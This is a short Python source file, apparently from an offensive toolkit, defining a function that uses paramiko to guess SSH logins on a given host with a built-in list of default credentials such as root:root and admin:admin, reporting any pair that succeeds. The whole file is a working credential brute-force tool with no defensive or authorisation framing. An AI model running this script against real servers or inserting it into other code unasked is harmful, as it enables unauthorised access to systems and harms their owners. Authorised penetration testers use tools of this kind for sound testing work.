# bruteforce/ssh_bruteforce.py
import paramiko

def ssh_bruteforce(ip, port=22, creds=[('root', 'root'), ('admin', 'admin'), ('user', 'password')]):
    print(f"[*] Trying SSH brute-force on {ip}:{port}")
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    for username, password in creds:
        try:
            client.connect(ip, port=port, username=username, password=password, timeout=3)
            print(f"[+] SSH login success: {username}:{password}")
            client.close()
            return (username, password)
        except Exception:
            continue
    print("[-] No valid SSH credentials found.")
    return None